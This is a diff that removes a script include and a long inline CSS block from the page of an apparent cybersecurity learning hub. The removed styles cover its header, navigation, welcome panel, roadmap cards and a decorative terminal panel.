@@ -18,1963 +18,19 @@
   <link rel="stylesheet" href="style.css" />
   <link rel="stylesheet" href="css/style.css" />
 
-  <!-- Master Installation & Usage Guides Dataset -->
-  <script src="js/guides-data.js"></script>
 
-  <style>
-    /* Dedicated Cyber Knowledge Hub Styling */
-    .hub-site-header {
-      position: fixed;
-      top: 0;
-      left: 0;
-      width: 100%;
-      height: 74px;
-      background: rgba(9, 9, 11, 0.96);
-      backdrop-filter: blur(20px);
-      -webkit-backdrop-filter: blur(20px);
-      border-bottom: 1px solid var(--border-card);
-      z-index: 1000;
-      display: flex;
-      align-items: center;
-    }
-
-    .hub-header-container {
-      width: 100%;
-      max-width: 100%;
-      padding: 0 24px;
-      display: flex;
-      align-items: center;
-      justify-content: space-between;
-      gap: 16px;
-      position: relative;
-    }
-
-    .hub-site-header .brand {
-      display: flex;
-      align-items: center;
-      gap: 12px;
-      text-decoration: none;
-      flex-shrink: 0;
-      z-index: 5;
-    }
-
-    .hub-nav-wrap {
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      flex: 1;
-      min-width: 0;
-      overflow-x: auto;
-      scrollbar-width: none;
-      -ms-overflow-style: none;
-      padding: 2px 6px;
-      margin: 0 8px;
-    }
-
-    .hub-nav-wrap::-webkit-scrollbar {
-      display: none;
-    }
-
-    .hub-nav-links {
-      display: flex;
-      align-items: center;
-      gap: 6px;
-      list-style: none;
-      margin: 0;
-      padding: 4px 6px;
-      white-space: nowrap;
-      flex-shrink: 0;
-      background: rgba(14, 18, 25, 0.75);
-      border: 1px solid rgba(255, 255, 255, 0.08);
-      border-radius: 8px;
-    }
-
-    .hub-nav-links .nav-link {
-      font-family: var(--font-mono);
-      font-size: 11.5px;
-      color: #94a3b8;
-      text-decoration: none;
-      transition: var(--transition);
-      font-weight: 600;
-      display: inline-flex;
-      align-items: center;
-      gap: 7px;
-      padding: 7px 12px;
-      border-radius: 6px;
-      border: 1px solid transparent;
-      cursor: pointer;
-      position: relative;
-    }
-
-    .hub-nav-links .nav-link:hover {
-      color: #ffffff;
-      background: rgba(255, 0, 56, 0.1);
-      border-color: rgba(255, 0, 56, 0.3);
-    }
-
-    .hub-nav-links .nav-link.active {
-      color: #ffffff;
-      background: rgba(255, 0, 56, 0.18);
-      border-color: rgba(255, 0, 56, 0.6);
-      box-shadow: 0 0 14px rgba(255, 0, 56, 0.28), inset 0 1px 0 rgba(255, 255, 255, 0.15);
-    }
-
-    .hub-nav-links .nav-link.active::after {
-      content: '';
-      position: absolute;
-      bottom: -1px;
-      left: 15%;
-      right: 15%;
-      height: 2px;
-      background: var(--crimson-primary);
-      border-radius: 2px;
-      box-shadow: 0 0 8px var(--crimson-glow);
-    }
-
-    .nav-link-guides {
-      background: rgba(255, 0, 56, 0.12) !important;
-      border: 1px solid rgba(255, 0, 56, 0.45) !important;
-      color: #ffffff !important;
-      font-weight: 700 !important;
-      box-shadow: 0 0 12px rgba(255, 0, 56, 0.2);
-    }
-
-    .nav-link-guides:hover,
-    .nav-link-guides.active {
-      background: rgba(255, 0, 56, 0.25) !important;
-      border-color: var(--crimson-primary) !important;
-      box-shadow: 0 0 18px rgba(255, 0, 56, 0.5);
-    }
-
-    .hub-nav-pill-badge {
-      font-size: 8.5px;
-      font-weight: 800;
-      letter-spacing: 0.08em;
-      padding: 2px 6px;
-      border-radius: 3px;
-      background: var(--crimson-primary);
-      color: #ffffff;
-    }
-
-    .hub-user-badge-wrap {
-      display: flex;
-      align-items: center;
-      gap: 10px;
-      flex-shrink: 0;
-      z-index: 5;
-    }
-
-    .hub-operator-pill {
-      display: inline-flex;
-      align-items: center;
-      gap: 8px;
-      padding: 6px 14px;
-      background: #0d121a;
-      border: 1px solid rgba(255, 0, 56, 0.4);
-      border-radius: 6px;
-      font-family: var(--font-mono);
-      font-size: 11.5px;
-      font-weight: 700;
-      color: #f1f5f9;
-      letter-spacing: 0.05em;
-      box-shadow: 0 2px 8px rgba(0, 0, 0, 0.4);
-    }
-
-    .hub-operator-pill .pulsing-dot {
-      width: 7px;
-      height: 7px;
-      border-radius: 50%;
-      background: #10b981;
-      box-shadow: 0 0 8px #10b981;
-      flex-shrink: 0;
-    }
-
-    .hub-logout-action-btn {
-      display: inline-flex;
-      align-items: center;
-      gap: 7px;
-      padding: 7px 14px;
-      background: rgba(255, 0, 56, 0.15);
-      border: 1px solid var(--crimson-primary);
-      border-radius: 6px;
-      color: #ffffff;
-      font-family: var(--font-mono);
-      font-size: 11.5px;
-      font-weight: 800;
-      letter-spacing: 0.08em;
-      cursor: pointer;
-      transition: var(--transition);
-      box-shadow: 0 2px 10px rgba(255, 0, 56, 0.25);
-      flex-shrink: 0;
-    }
-
-    .hub-logout-action-btn:hover {
-      background: var(--crimson-primary);
-      color: #ffffff;
-      border-color: #ff335f;
-      box-shadow: 0 0 16px rgba(255, 0, 56, 0.55);
-      transform: translateY(-1px);
-    }
-
-    .hub-logout-action-btn:active {
-      transform: translateY(0);
-    }
-
-    /* Hero Section */
-    .hub-hero {
-      padding: 48px 0 32px;
-      text-align: center;
-      position: relative;
-    }
-
-    .hub-hero-tag {
-      display: inline-flex;
-      align-items: center;
-      gap: 8px;
-      font-family: var(--font-mono);
-      font-size: 11px;
-      font-weight: 700;
-      letter-spacing: 0.12em;
-      color: var(--crimson-light);
-      padding: 5px 14px;
-      background: rgba(255, 0, 56, 0.08);
-      border: 1px solid rgba(255, 0, 56, 0.25);
-      border-radius: var(--radius-full);
-      margin-bottom: 16px;
-    }
-
-    .hub-hero-title {
-      font-size: clamp(26px, 4vw, 42px);
-      font-weight: 800;
-      line-height: 1.15;
-      letter-spacing: -0.02em;
-      color: #fff;
-      margin-bottom: 14px;
-    }
-
-    .hub-hero-title span {
-      color: var(--crimson-light);
-      text-shadow: 0 0 20px rgba(255, 0, 56, 0.4);
-    }
-
-    .hub-hero-desc {
-      font-size: 15px;
-      color: var(--text-secondary);
-      max-width: 720px;
-      margin: 0 auto 28px;
-      line-height: 1.6;
-    }
-
-    /* Stats Banner */
-    .hub-stats-grid {
-      display: grid;
-      grid-template-columns: repeat(auto-fit, minmax(140px, 1fr));
-      gap: 12px;
-      max-width: 800px;
-      margin: 0 auto 36px;
-    }
-
-    .hub-stat-card {
-      background: var(--bg-card);
-      border: 1px solid var(--border-card);
-      border-radius: var(--radius-md);
-      padding: 12px 16px;
-      text-align: center;
-      transition: var(--transition);
-    }
-
-    .hub-stat-card:hover {
-      border-color: var(--crimson-glow);
-      transform: translateY(-2px);
-    }
-
-    .hub-stat-num {
-      font-family: var(--font-mono);
-      font-size: 22px;
-      font-weight: 800;
-      color: var(--crimson-light);
-    }
-
-    .hub-stat-label {
-      font-family: var(--font-mono);
-      font-size: 11px;
-      color: var(--text-muted);
-      text-transform: uppercase;
-      letter-spacing: 0.05em;
-    }
-
-    /* Controls: Search + Filter Tabs */
-    .hub-controls-bar {
-      background: var(--bg-card);
-      border: 1px solid var(--border-card);
-      border-radius: var(--radius-lg);
-      padding: 20px;
-      margin-bottom: 32px;
-      display: flex;
-      flex-direction: column;
-      gap: 16px;
-      box-shadow: 0 8px 30px rgba(0, 0, 0, 0.35);
-    }
-
-    .hub-search-wrap {
-      position: relative;
-      width: 100%;
-    }
-
-    .hub-search-wrap i {
-      position: absolute;
-      left: 16px;
-      top: 50%;
-      transform: translateY(-50%);
-      color: var(--text-muted);
-      font-size: 16px;
-    }
-
-    .hub-search-input {
-      width: 100%;
-      background: rgba(0, 0, 0, 0.5);
-      border: 1px solid var(--border-card);
-      border-radius: var(--radius-md);
-      padding: 14px 16px 14px 44px;
-      font-family: var(--font-mono);
-      font-size: 14px;
-      color: var(--text-primary);
-      transition: var(--transition);
-      outline: none;
-    }
-
-    .hub-search-input:focus {
-      border-color: var(--crimson-light);
-      box-shadow: 0 0 16px var(--crimson-glow);
-    }
-
-    /* Welcome & Onboarding Sequence Panel */
-    .hub-welcome-panel {
-      background: linear-gradient(135deg, rgba(20, 24, 33, 0.95) 0%, rgba(13, 17, 23, 0.98) 100%);
-      border: 1px solid rgba(255, 0, 56, 0.35);
-      border-radius: var(--radius-lg);
-      padding: 32px 36px;
-      margin-bottom: 32px;
-      position: relative;
-      overflow: hidden;
-      box-shadow: 0 16px 40px rgba(0, 0, 0, 0.7), 0 0 24px rgba(255, 0, 56, 0.15);
-    }
-
-    .hub-welcome-panel::before {
-      content: '';
-      position: absolute;
-      top: 0;
-      left: 0;
-      right: 0;
-      height: 3px;
-      background: linear-gradient(90deg, #ff0038, #ff4d6d, #b30027);
-    }
-
-    .welcome-top-meta {
-      display: flex;
-      align-items: center;
-      justify-content: space-between;
-      gap: 16px;
-      flex-wrap: wrap;
-      margin-bottom: 16px;
-    }
-
-    .welcome-badge {
-      display: inline-flex;
-      align-items: center;
-      gap: 8px;
-      font-family: var(--font-mono);
-      font-size: 11px;
-      font-weight: 700;
-      color: var(--crimson-light);
-      letter-spacing: 0.08em;
-      text-transform: uppercase;
-      background: rgba(255, 0, 56, 0.08);
-      border: 1px solid rgba(255, 0, 56, 0.2);
-      padding: 5px 12px;
-      border-radius: 20px;
-    }
-
-    .welcome-status-pill {
-      display: inline-flex;
-      align-items: center;
-      gap: 8px;
-      font-family: var(--font-mono);
-      font-size: 11px;
-      font-weight: 700;
-      color: #34d399;
-      background: rgba(16, 185, 129, 0.08);
-      border: 1px solid rgba(16, 185, 129, 0.25);
-      padding: 5px 12px;
-      border-radius: 20px;
-    }
-
-    .welcome-title {
-      font-size: clamp(30px, 4vw, 44px);
-      font-weight: 800;
-      color: #ffffff;
-      margin-bottom: 12px;
-      line-height: 1.25;
-      letter-spacing: -0.02em;
-    }
-
-    .welcome-title .text-crimson {
-      color: var(--crimson-primary) !important;
-      background: none !important;
-      -webkit-text-fill-color: var(--crimson-primary) !important;
-      text-shadow: 0 0 16px rgba(255, 0, 56, 0.45);
-    }
-
-    .welcome-subtitle-tag {
-      font-family: var(--font-mono);
-      font-size: 11px;
-      color: var(--crimson-light);
-      letter-spacing: 0.12em;
-      text-transform: uppercase;
-      font-weight: 700;
-      margin-bottom: 16px;
-      display: inline-flex;
-      align-items: center;
-      gap: 8px;
-    }
-
-    /* Live Telemetry Deck */
-    .welcome-telemetry-deck {
-      display: grid;
-      grid-template-columns: repeat(auto-fit, minmax(220px, 1fr));
-      gap: 12px;
-      margin-bottom: 24px;
-    }
-
-    .telemetry-card {
-      background: rgba(0, 0, 0, 0.55);
-      border: 1px solid rgba(255, 255, 255, 0.08);
-      border-radius: var(--radius-sm);
-      padding: 14px 16px;
-      position: relative;
-      overflow: hidden;
-      display: flex;
-      flex-direction: column;
-      gap: 6px;
-      transition: var(--transition);
-    }
-
-    .telemetry-card:hover {
-      border-color: rgba(255, 0, 56, 0.4);
-      background: rgba(255, 0, 56, 0.04);
-      transform: translateY(-2px);
-    }
-
-    .telemetry-label {
-      font-family: var(--font-mono);
-      font-size: 10px;
-      color: var(--text-muted);
-      letter-spacing: 0.08em;
-      text-transform: uppercase;
-      display: flex;
-      align-items: center;
-      justify-content: space-between;
-    }
-
-    .telemetry-value {
-      font-family: var(--font-mono);
-      font-size: 14px;
-      font-weight: 800;
-      color: #ffffff;
-      letter-spacing: 0.04em;
-    }
-
-    .telemetry-desc {
-      font-size: 11px;
-      color: var(--text-secondary);
-      line-height: 1.4;
-    }
-
-    .welcome-desc {
-      font-size: 15px;
-      color: var(--text-secondary);
-      line-height: 1.7;
-      max-width: 960px;
-      margin-bottom: 22px;
-    }
-
-    .welcome-desc strong {
-      color: #ffffff;
-    }
-
-    /* High-Tech Bento Matrix Grid (What We Provide) */
-    .welcome-offering-section-title {
-      font-size: 22px;
-      font-weight: 800;
-      color: #ffffff;
-      margin-bottom: 8px;
-      display: flex;
-      align-items: center;
-      gap: 10px;
-    }
-
-    .welcome-offering-section-desc {
-      font-size: 14px;
-      color: var(--text-secondary);
-      margin-bottom: 22px;
-      line-height: 1.6;
-    }
-
-    .welcome-offering-grid {
-      display: grid;
-      grid-template-columns: repeat(auto-fit, minmax(320px, 1fr));
-      gap: 16px;
-      margin-bottom: 28px;
-    }
-
-    .offering-card {
-      background: rgba(255, 255, 255, 0.025);
-      border: 1px solid var(--border-card);
-      border-radius: var(--radius-md);
-      padding: 22px 24px;
-      display: flex;
-      flex-direction: column;
-      justify-content: space-between;
-      transition: var(--transition);
-      position: relative;
-      overflow: hidden;
-    }
-
-    .offering-card::before {
-      content: '';
-      position: absolute;
-      top: 0;
-      left: 0;
-      width: 3px;
-      height: 100%;
-      background: rgba(255, 0, 56, 0.3);
-      transition: var(--transition);
-    }
-
-    .offering-card:hover {
-      background: rgba(255, 255, 255, 0.045);
-      border-color: rgba(255, 0, 56, 0.4);
-      transform: translateY(-2px);
-      box-shadow: 0 10px 24px rgba(0, 0, 0, 0.6), 0 0 16px rgba(255, 0, 56, 0.12);
-    }
-
-    .offering-card:hover::before {
-      background: var(--crimson-primary);
-      box-shadow: 0 0 10px var(--crimson-glow);
-    }
-
-    .offering-top {
-      display: flex;
-      align-items: center;
-      justify-content: space-between;
-      gap: 10px;
-      margin-bottom: 12px;
-    }
-
-    .offering-module-badge {
-      font-family: var(--font-mono);
-      font-size: 10px;
-      font-weight: 700;
-      color: var(--crimson-light);
-      letter-spacing: 0.08em;
-      text-transform: uppercase;
-      background: rgba(255, 0, 56, 0.1);
-      padding: 3px 8px;
-      border-radius: 4px;
-      border: 1px solid rgba(255, 0, 56, 0.25);
-    }
-
-    .offering-icon {
-      font-size: 18px;
-      color: var(--crimson-light);
-    }
-
-    .offering-title {
-      font-size: 17px;
-      font-weight: 700;
-      color: #ffffff;
-      margin-bottom: 8px;
-      line-height: 1.35;
-    }
-
-    .offering-desc {
-      font-size: 13px;
-      color: var(--text-secondary);
-      line-height: 1.6;
-      margin-bottom: 14px;
-    }
-
-    .offering-sublist {
-      list-style: none;
-      padding: 0;
-      margin: 0 0 18px 0;
-      display: flex;
-      flex-direction: column;
-      gap: 6px;
-    }
-
-    .offering-sublist li {
-      display: flex;
-      align-items: flex-start;
-      gap: 8px;
-      font-size: 12px;
-      color: var(--text-muted);
-      line-height: 1.45;
-    }
-
-    .offering-sublist li i {
-      color: var(--crimson-primary);
-      font-size: 10px;
-      margin-top: 4px;
-      flex-shrink: 0;
-    }
-
-    .offering-sublist li strong {
-      color: #e2e8f0;
-    }
-
-    .offering-footer {
-      display: flex;
-      align-items: center;
-      justify-content: space-between;
-      padding-top: 14px;
-      border-top: 1px solid rgba(255, 255, 255, 0.08);
-      gap: 12px;
-      margin-top: auto;
-      flex-wrap: wrap;
-    }
-
-    .offering-audience {
-      font-family: var(--font-mono);
-      font-size: 11px;
-      color: var(--text-secondary);
-      display: inline-flex;
-      align-items: center;
-      gap: 6px;
-    }
-
-    .offering-nav-tag {
-      font-family: var(--font-mono);
-      font-size: 10.5px;
-      font-weight: 700;
-      color: var(--crimson-light);
-      background: rgba(255, 0, 56, 0.1);
-      border: 1px solid rgba(255, 0, 56, 0.3);
-      border-radius: 4px;
-      padding: 4px 10px;
-      letter-spacing: 0.05em;
-      text-transform: uppercase;
-      display: inline-flex;
-      align-items: center;
-      gap: 6px;
-      white-space: nowrap;
-    }
-
-    /* Zero-Search Student Roadmap Box */
-    .welcome-roadmap-box {
-      background: rgba(0, 0, 0, 0.5);
-      border: 1px solid rgba(255, 255, 255, 0.08);
-      border-radius: var(--radius-md);
-      padding: 24px 26px;
-      margin-bottom: 24px;
-    }
-
-    .welcome-roadmap-header {
-      display: flex;
-      align-items: center;
-      justify-content: space-between;
-      flex-wrap: wrap;
-      gap: 12px;
-      margin-bottom: 16px;
-    }
-
-    .welcome-roadmap-title {
-      font-size: 16px;
-      font-weight: 700;
-      color: #ffffff;
-      display: flex;
-      align-items: center;
-      gap: 10px;
-    }
-
-    .roadmap-steps-grid {
-      display: grid;
-      grid-template-columns: repeat(auto-fit, minmax(190px, 1fr));
-      gap: 12px;
-    }
-
-    .roadmap-step-card {
-      background: rgba(255, 255, 255, 0.03);
-      border: 1px solid rgba(255, 255, 255, 0.06);
-      border-radius: var(--radius-sm);
-      padding: 14px 16px;
-      display: flex;
-      flex-direction: column;
-      gap: 6px;
-    }
-
-    .roadmap-step-num {
-      font-family: var(--font-mono);
-      font-size: 11px;
-      font-weight: 800;
-      color: var(--crimson-light);
-      letter-spacing: 0.08em;
-    }
-
-    .roadmap-step-title {
-      font-size: 13px;
-      font-weight: 700;
-      color: #ffffff;
-    }
-
-    .roadmap-step-desc {
-      font-size: 11.5px;
-      color: var(--text-muted);
-      line-height: 1.45;
-    }
-
-    /* Directive Callout Box */
-    .hub-directive-box {
-      background: rgba(13, 17, 23, 0.85);
-      border: 1px solid rgba(255, 0, 56, 0.35);
-      border-left: 4px solid var(--crimson-primary);
-      border-radius: var(--radius-md);
-      padding: 22px 26px;
-      margin-bottom: 24px;
-      box-shadow: 0 10px 30px rgba(0, 0, 0, 0.6), inset 0 0 20px rgba(255, 0, 56, 0.05);
-    }
-    .hub-directive-title {
-      font-family: var(--font-mono);
-      font-size: 11px;
-      font-weight: 800;
-      color: var(--crimson-light);
-      letter-spacing: 0.1em;
-      text-transform: uppercase;
-      display: flex;
-      align-items: center;
-      gap: 10px;
-      margin-bottom: 12px;
-    }
-    .hub-directive-content p {
-      font-size: 13.5px;
-      line-height: 1.7;
-      color: var(--text-secondary);
-      margin-bottom: 10px;
-    }
-    .hub-directive-content p:last-child {
-      margin-bottom: 0;
-    }
-    .hub-directive-content strong {
-      color: #ffffff;
-    }
-
-    /* 4 Curation Badges Grid */
-    .curation-badges-grid {
-      display: grid;
-      grid-template-columns: repeat(auto-fit, minmax(220px, 1fr));
-      gap: 12px;
-      margin-bottom: 36px;
-    }
-    .curation-badge-card {
-      background: rgba(0, 0, 0, 0.6);
-      border: 1px solid rgba(255, 255, 255, 0.08);
-      border-radius: var(--radius-sm);
-      padding: 12px 16px;
-      display: flex;
-      align-items: center;
-      gap: 12px;
-      transition: var(--transition);
-    }
-    .curation-badge-card:hover {
-      border-color: rgba(255, 0, 56, 0.4);
-      background: rgba(255, 0, 56, 0.04);
-      transform: translateY(-2px);
-    }
-    .curation-badge-card .status-dot {
-      width: 8px;
-      height: 8px;
-      border-radius: 50%;
-      background: var(--crimson-primary);
-      box-shadow: 0 0 8px var(--crimson-primary);
-      flex-shrink: 0;
-    }
-    .curation-badge-card .status-dot.green {
-      background: #10b981;
-      box-shadow: 0 0 8px #10b981;
-    }
-    .curation-badge-title {
-      font-family: var(--font-mono);
-      font-size: 10.5px;
-      font-weight: 800;
-      color: #ffffff;
-      letter-spacing: 0.06em;
-      text-transform: uppercase;
-    }
-    .curation-badge-sub {
-      font-size: 11px;
-      color: var(--text-muted);
-      margin-top: 2px;
-    }
-
-    /* Section Subtitle Eyebrow & Headers */
-    .section-eyebrow-tag {
-      font-family: var(--font-mono);
-      font-size: 11px;
-      font-weight: 700;
-      color: var(--crimson-light);
-      letter-spacing: 0.12em;
-      text-transform: uppercase;
-      display: flex;
-      align-items: center;
-      gap: 8px;
-      margin-bottom: 6px;
-    }
-    .section-main-heading {
-      font-size: clamp(22px, 3vw, 28px);
-      font-weight: 800;
-      color: #ffffff;
-      letter-spacing: -0.01em;
-      margin-bottom: 8px;
-    }
-    .section-main-heading .text-crimson {
-      color: var(--crimson-primary) !important;
-    }
-    .section-main-desc {
-      font-size: 13.5px;
-      color: var(--text-secondary);
-      max-width: 840px;
-      line-height: 1.6;
-      margin-bottom: 24px;
-    }
-
-    /* 5-Phase Horizontal Timeline Cards */
-    .roadmap-horizontal-list {
-      display: flex;
-      flex-direction: column;
-      gap: 16px;
-      margin-bottom: 38px;
-    }
-    .roadmap-phase-card {
-      background: rgba(13, 17, 23, 0.85);
-      border: 1px solid rgba(255, 255, 255, 0.08);
-      border-radius: var(--radius-md);
-      padding: 22px 24px;
-      display: grid;
-      grid-template-columns: 110px 1fr 270px;
-      gap: 24px;
-      align-items: center;
-      transition: var(--transition);
-      position: relative;
-      overflow: hidden;
-    }
-    @media (max-width: 992px) {
-      .roadmap-phase-card {
-        grid-template-columns: 1fr;
-        gap: 16px;
-      }
-    }
-    .roadmap-phase-card::before {
-      content: '';
-      position: absolute;
-      top: 0;
-      left: 0;
-      width: 3px;
-      height: 100%;
-      background: rgba(255, 0, 56, 0.35);
-      transition: var(--transition);
-    }
-    .roadmap-phase-card:hover {
-      border-color: rgba(255, 0, 56, 0.45);
-      background: rgba(255, 255, 255, 0.035);
-      box-shadow: 0 10px 24px rgba(0, 0, 0, 0.6), 0 0 18px rgba(255, 0, 56, 0.12);
-      transform: translateY(-2px);
-    }
-    .roadmap-phase-card:hover::before {
-      background: var(--crimson-primary);
-      box-shadow: 0 0 10px var(--crimson-glow);
-    }
-    .phase-badge-col {
-      display: flex;
-      flex-direction: column;
-      align-items: flex-start;
-      gap: 6px;
-    }
-    .phase-num {
-      font-family: var(--font-mono);
-      font-size: 26px;
-      font-weight: 900;
-      color: #ffffff;
-      line-height: 1;
-    }
-    .phase-sub-tag {
-      font-family: var(--font-mono);
-      font-size: 9px;
-      font-weight: 800;
-      color: var(--crimson-light);
-      background: rgba(255, 0, 56, 0.12);
-      border: 1px solid rgba(255, 0, 56, 0.3);
-      padding: 2px 6px;
-      border-radius: 3px;
-      letter-spacing: 0.08em;
-      white-space: nowrap;
-    }
-    .phase-content-col h3 {
-      font-size: 16.5px;
-      font-weight: 700;
-      color: #ffffff;
-      margin-bottom: 6px;
-    }
-    .phase-content-col p {
-      font-size: 13px;
-      color: var(--text-secondary);
-      line-height: 1.55;
-      margin-bottom: 12px;
-    }
-    .phase-checklist {
-      display: grid;
-      grid-template-columns: repeat(auto-fit, minmax(230px, 1fr));
-      gap: 6px 14px;
-      list-style: none;
-      padding: 0;
-      margin: 0 0 12px 0;
-    }
-    .phase-checklist li {
-      font-size: 12px;
-      color: #cbd5e1;
-      display: flex;
-      align-items: center;
-      gap: 8px;
-    }
-    .phase-checklist li i {
-      color: var(--crimson-primary);
-      font-size: 11px;
-      flex-shrink: 0;
-    }
-    .phase-nav-deploy {
-      display: inline-flex;
-      align-items: center;
-      gap: 6px;
-      font-family: var(--font-mono);
-      font-size: 11px;
-      font-weight: 700;
-      color: var(--crimson-light);
-      text-decoration: none;
-      cursor: pointer;
-      transition: var(--transition);
-      background: rgba(255, 0, 56, 0.08);
-      border: 1px solid rgba(255, 0, 56, 0.25);
-      padding: 4px 10px;
-      border-radius: 4px;
-    }
-    .phase-nav-deploy:hover {
-      color: #ffffff;
-      background: rgba(255, 0, 56, 0.25);
-      border-color: var(--crimson-primary);
-    }
-    .phase-readiness-col {
-      background: rgba(0, 0, 0, 0.5);
-      border: 1px solid rgba(255, 255, 255, 0.06);
-      border-radius: var(--radius-sm);
-      padding: 14px 16px;
-      display: flex;
-      flex-direction: column;
-      gap: 6px;
-    }
-    .readiness-label {
-      font-family: var(--font-mono);
-      font-size: 10px;
-      font-weight: 800;
-      color: var(--text-muted);
-      letter-spacing: 0.08em;
-      text-transform: uppercase;
-    }
-    .readiness-desc {
-      font-size: 12px;
-      color: #e2e8f0;
-      line-height: 1.45;
-    }
-    .readiness-checkpoint {
-      font-family: var(--font-mono);
-      font-size: 10px;
-      font-weight: 800;
-      color: #34d399;
-      display: flex;
-      align-items: center;
-      gap: 6px;
-      margin-top: 4px;
-    }
-
-    /* Specialization Pathway Cards */
-    .specialization-grid {
-      display: grid;
-      grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
-      gap: 18px;
-      margin-bottom: 38px;
-    }
-    .pathway-card {
-      background: rgba(13, 17, 23, 0.85);
-      border: 1px solid rgba(255, 255, 255, 0.08);
-      border-radius: var(--radius-md);
-      padding: 24px;
-      display: flex;
-      flex-direction: column;
-      justify-content: space-between;
-      transition: var(--transition);
-      position: relative;
-    }
-    .pathway-card.pathway-red {
-      border-top: 3px solid var(--crimson-primary);
-    }
-    .pathway-card.pathway-green {
-      border-top: 3px solid #10b981;
-    }
-    .pathway-card.pathway-gold {
-      border-top: 3px solid #f59e0b;
-    }
-    .pathway-card:hover {
-      transform: translateY(-3px);
-      box-shadow: 0 12px 28px rgba(0, 0, 0, 0.7);
-    }
-    .pathway-card.pathway-red:hover {
-      border-color: rgba(255, 0, 56, 0.45);
-    }
-    .pathway-card.pathway-green:hover {
-      border-color: rgba(16, 185, 129, 0.45);
-    }
-    .pathway-card.pathway-gold:hover {
-      border-color: rgba(245, 158, 11, 0.45);
-    }
-    .pathway-header {
-      display: flex;
-      align-items: center;
-      justify-content: space-between;
-      gap: 10px;
-      margin-bottom: 12px;
-    }
-    .pathway-badge {
-      font-family: var(--font-mono);
-      font-size: 10px;
-      font-weight: 800;
-      letter-spacing: 0.08em;
-      text-transform: uppercase;
-      padding: 3px 8px;
-      border-radius: 4px;
-    }
-    .pathway-badge.red {
-      color: var(--crimson-light);
-      background: rgba(255, 0, 56, 0.12);
-      border: 1px solid rgba(255, 0, 56, 0.3);
-    }
-    .pathway-badge.green {
-      color: #34d399;
-      background: rgba(16, 185, 129, 0.12);
-      border: 1px solid rgba(16, 185, 129, 0.3);
-    }
-    .pathway-badge.gold {
-      color: #fbbf24;
-      background: rgba(245, 158, 11, 0.12);
-      border: 1px solid rgba(245, 158, 11, 0.3);
-    }
-    .pathway-icon {
-      font-size: 20px;
-    }
-    .pathway-icon.red { color: var(--crimson-primary); }
-    .pathway-icon.green { color: #10b981; }
-    .pathway-icon.gold { color: #f59e0b; }
-    .pathway-title {
-      font-size: 18px;
-      font-weight: 700;
-      color: #ffffff;
-      margin-bottom: 8px;
-    }
-    .pathway-desc {
-      font-size: 13px;
-      color: var(--text-secondary);
-      line-height: 1.55;
-      margin-bottom: 16px;
-    }
-    .pathway-list {
-      list-style: none;
-      padding: 0;
-      margin: 0 0 18px 0;
-      display: flex;
-      flex-direction: column;
-      gap: 7px;
-    }
-    .pathway-list li {
-      font-size: 12px;
-      color: #cbd5e1;
-      display: flex;
-      align-items: center;
-      gap: 8px;
-    }
-    .pathway-list li i {
-      font-size: 10px;
-      flex-shrink: 0;
-    }
-    .pathway-footer {
-      border-top: 1px solid rgba(255, 255, 255, 0.08);
-      padding-top: 12px;
-      margin-top: auto;
-    }
-    .pathway-roles-label {
-      font-family: var(--font-mono);
-      font-size: 9.5px;
-      font-weight: 800;
-      color: var(--text-muted);
-      letter-spacing: 0.08em;
-      text-transform: uppercase;
-      margin-bottom: 4px;
-    }
-    .pathway-roles {
-      font-size: 12px;
-      font-weight: 600;
-      color: #ffffff;
-    }
-
-    /* 4 Golden Rules Box */
-    .golden-rules-container {
-      background: rgba(13, 17, 23, 0.7);
-      border: 1px solid rgba(255, 255, 255, 0.08);
-      border-radius: var(--radius-md);
-      padding: 24px;
-      margin-bottom: 38px;
-      display: grid;
-      grid-template-columns: 320px 1fr;
-      gap: 28px;
-      align-items: center;
-    }
-    @media (max-width: 992px) {
-      .golden-rules-container {
-        grid-template-columns: 1fr;
-      }
-    }
-    .golden-rules-intro h3 {
-      font-size: 19px;
-      font-weight: 800;
-      color: #ffffff;
-      margin-bottom: 8px;
-    }
-    .golden-rules-intro p {
-      font-size: 13px;
-      color: var(--text-secondary);
-      line-height: 1.55;
-    }
-    .golden-rules-grid {
-      display: grid;
-      grid-template-columns: repeat(auto-fit, minmax(240px, 1fr));
-      gap: 14px;
-    }
-    .golden-rule-card {
-      background: rgba(0, 0, 0, 0.45);
-      border: 1px solid rgba(255, 255, 255, 0.06);
-      border-radius: var(--radius-sm);
-      padding: 14px 16px;
-      transition: var(--transition);
-    }
-    .golden-rule-card:hover {
-      border-color: rgba(255, 0, 56, 0.35);
-      background: rgba(255, 0, 56, 0.03);
-    }
-    .golden-rule-header {
-      font-family: var(--font-mono);
-      font-size: 11px;
-      font-weight: 800;
-      color: var(--crimson-light);
-      letter-spacing: 0.06em;
-      margin-bottom: 6px;
-      display: flex;
-      align-items: center;
-      gap: 8px;
-    }
-    .golden-rule-text {
-      font-size: 12px;
-      color: var(--text-secondary);
-      line-height: 1.5;
-    }
-
-    /* Cyber Terminal Deck */
-    .cyber-terminal-deck {
-      background: #090d12;
-      border: 1px solid rgba(255, 0, 56, 0.35);
-      border-radius: var(--radius-md);
-      overflow: hidden;
-      margin-bottom: 32px;
-      box-shadow: 0 14px 36px rgba(0, 0, 0, 0.7), 0 0 20px rgba(255, 0, 56, 0.1);
-    }
-    .terminal-titlebar {
-      background: #11161f;
-      border-bottom: 1px solid rgba(255, 255, 255, 0.08);
-      padding: 10px 16px;
-      display: flex;
-      align-items: center;
-      justify-content: space-between;
-    }
-    .terminal-dots {
-      display: flex;
-      align-items: center;
-      gap: 6px;
-    }
-    .terminal-dot {
-      width: 10px;
-      height: 10px;
-      border-radius: 50%;
-    }
-    .terminal-dot.red { background: #ff5f56; }
-    .terminal-dot.yellow { background: #ffbd2e; }
-    .terminal-dot.green { background: #27c93f; }
-    .terminal-title-text {
-      font-family: var(--font-mono);
-      font-size: 11px;
-      color: var(--text-muted);
-      letter-spacing: 0.06em;
-    }
-    .terminal-status-tag {
-      font-family: var(--font-mono);
-      font-size: 10px;
-      color: #34d399;
-      display: flex;
-      align-items: center;
-      gap: 6px;
-    }
-    .terminal-viewport {
-      padding: 18px 20px;
-      font-family: var(--font-mono);
-      font-size: 12.5px;
-      line-height: 1.65;
-      color: #e2e8f0;
-      background: #06090d;
-      min-height: 220px;
-      overflow-x: auto;
-    }
-    .term-prompt-line {
-      color: #38bdf8;
-    }
-    .term-command {
-      color: #ffffff;
-      font-weight: 700;
-    }
-    .term-log-line {
-      color: #94a3b8;
-    }
-    .term-success {
-      color: #34d399;
-    }
-    .term-crimson {
-      color: var(--crimson-light);
-    }
-    .term-action-alert {
